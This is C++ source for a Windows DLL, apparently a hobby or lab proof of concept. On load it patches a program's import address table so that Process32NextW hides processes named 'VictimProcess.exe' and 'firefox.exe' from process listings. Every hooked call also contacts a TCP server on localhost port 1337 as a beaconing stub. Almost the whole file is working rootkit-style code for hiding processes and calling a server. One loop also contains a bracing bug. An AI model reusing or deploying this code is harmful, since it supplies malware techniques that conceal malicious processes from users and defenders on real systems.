// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

#include <iostream>
#include <windows.h>
#include <Psapi.h>
#include <winternl.h>
// For hooking function
#include <TlHelp32.h>
// For networking
#include <WinSock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

// Define some stuff :)
#define SERVER_PORT "1337"
#define BUFFER_LEN 1024

// TYPEDEFS ARE MAGIC :)
// tfw missing the WINAPI declaration causes hours of debugging due to bad stack pointers
typedef BOOL(WINAPI *fnPtr)(HANDLE, LPPROCESSENTRY32);

// https://stackoverflow.com/questions/16473782/getprocaddress-and-function-pointers-is-this-correct
fnPtr OriginalProcess32Next;

int PollServer() {
	// https://docs.microsoft.com/en-us/windows/win32/winsock/initializing-winsock
	WSADATA wsaData;

	int iResult;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (!iResult) {
		// Start making packet
		struct addrinfo* result = NULL, * ptr = NULL, hints;

		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_UNSPEC;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		iResult = getaddrinfo("127.0.0.1", SERVER_PORT, &hints, &result);
		if (iResult) {
			WSACleanup();
			return 1;
		}
		// https://docs.microsoft.com/en-us/windows/win32/winsock/creating-a-socket-for-the-client
		SOCKET ConnSock = INVALID_SOCKET;
		ptr = result;
		ConnSock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnSock == INVALID_SOCKET) {
			freeaddrinfo(result);
			WSACleanup();
			return 1;
		}
		iResult = connect(ConnSock, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnSock);
			ConnSock = INVALID_SOCKET;
		}
		else {
			int recvbuflen = BUFFER_LEN;

			const char* sendbuf = "this is a test";
			char recvbuf[BUFFER_LEN];

			int iResult;

			// Send an initial buffer
			iResult = send(ConnSock, sendbuf, (int)strlen(sendbuf), 0);
			if (iResult == SOCKET_ERROR) {
				closesocket(ConnSock);
				WSACleanup();
				return 1;
			}

			printf("Bytes Sent: %ld\n", iResult);

			// shutdown the connection for sending since no more data will be sent
			// the client can still use the ConnectSocket for receiving data
			iResult = shutdown(ConnSock, SD_SEND);
			if (iResult == SOCKET_ERROR) {
				printf("shutdown failed: %d\n", WSAGetLastError());
				closesocket(ConnSock);
				WSACleanup();
				return 1;
			}

			// Receive data until the server closes the connection
			/*do {
				iResult = recv(ConnSock, recvbuf, recvbuflen, 0);
				if (iResult > 0)
					printf("Bytes received: %d\n", iResult);
				else if (iResult == 0)
					printf("Connection closed\n");
				else
					printf("recv failed: %d\n", WSAGetLastError());
			} while (iResult > 0);*/

			closesocket(ConnSock);
			WSACleanup();
			return 0;
		}

		freeaddrinfo(result);

		if (ConnSock == INVALID_SOCKET) {
			WSACleanup();
			return 1;
		}
	}
	return 1;
}

// Hooked function
BOOL WINAPI HookedProcess32Next(
	HANDLE           hSnapshot,
	LPPROCESSENTRY32 lppe
	)
{
	std::cout << "[DLL] [REPLACEMENT FUNC] Entering" << std::endl;
	std::cout << "[DLL] [REPLACEMENT FUNC] Calling original" << std::endl;
	BOOL success = OriginalProcess32Next(hSnapshot, lppe);
	BOOL to_rpt = TRUE;
	while (success && to_rpt) {
		// lppe is a PROCESS32ENTRY structure
		if (!wcsncmp(lppe->szExeFile, L"VictimProcess.exe", 18) || !wcsncmp(lppe->szExeFile, L"firefox.exe", 12)) {
			std::cout << "[DLL] [REPLACEMENT FUNC] Hiding Process" << std::endl;
			success = OriginalProcess32Next(hSnapshot, lppe);
			to_rpt = TRUE;
		} else {
			to_rpt = FALSE;
		}
	}
	std::cout << "[DLL] [REPLACEMENT FUNC] Done with emulating original function" << std::endl;
	std::cout << "[DLL] [REPLACEMENT FUNC] Contacting server..." << std::endl;

	PollServer();
	std::cout << "[DLL] [REPLACEMENT FUNC] Returning to caller" << std::endl;
	return success;
}

void HookFunction() {
	std::cout << "[DLL] Hooking process" << std::endl;
	std::cout << "[DLL] Saving original address of Process32NextW as " << GetProcAddress(GetModuleHandle(L"Kernel32"), "Process32NextW") << std::endl;
	OriginalProcess32Next = (fnPtr)GetProcAddress(GetModuleHandle(L"Kernel32"), "Process32NextW");
	// Get module handle for currently running .exe
	HMODULE hModule = GetModuleHandle(NULL);

	LONG baseAddress = (LONG)hModule;

	// Get to optional PE header
	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)(baseAddress + pIDH->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pIOH = (PIMAGE_OPTIONAL_HEADER) & (pINH->OptionalHeader);


	PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(baseAddress + pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	// Find Kernel32.dll
	while (pIID->Characteristics) {
		std::cout << "[DLL] Searching DLLs... " << (char*)(baseAddress + pIID->Name) << std::endl;
		if (!strcmp("Kernel32.dll", (char*)(baseAddress + pIID->Name)))
			std::cout << "[DLL] FOUND DLL!" << std::endl;
			break;
		pIID++;
	}

	// Search for Process32NextW - Process32Next is an alias but not a function exported by Kernel32.dll
	PIMAGE_THUNK_DATA pILT = (PIMAGE_THUNK_DATA)(baseAddress + pIID->OriginalFirstThunk);
	PIMAGE_THUNK_DATA pFirstThunkTest = (PIMAGE_THUNK_DATA)((baseAddress + pIID->FirstThunk));

	while (!(pILT->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pILT->u1.AddressOfData) {
		PIMAGE_IMPORT_BY_NAME pIIBM = (PIMAGE_IMPORT_BY_NAME)(baseAddress + pILT->u1.AddressOfData);
		std::cout << "[DLL] Searching functions in DLL... " << (char*)(pIIBM->Name) << std::endl;
		if (!strcmp("Process32NextW", (char*)(pIIBM->Name)))
			break;
		pFirstThunkTest++;
		pILT++;
	}

	// Write over function pointer
	DWORD dwOld = NULL;
	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(DWORD), PAGE_READWRITE, &dwOld);
	pFirstThunkTest->u1.Function = (DWORD)HookedProcess32Next;
	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(DWORD), dwOld, NULL);

	CloseHandle(hModule);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        std::cout << "[DLL] Attached to process!" << std::endl;
		HookFunction();
        break;
    case DLL_THREAD_ATTACH:
        std::cout << "[DLL] Attached to thread!" << std::endl;
        break;
    case DLL_THREAD_DETACH:
        std::cout << "[DLL] Detached from thread!" << std::endl;
        break;
    case DLL_PROCESS_DETACH:
        std::cout << "[DLL] Detached from process!" << std::endl;
        break;
    }
    return TRUE;
}

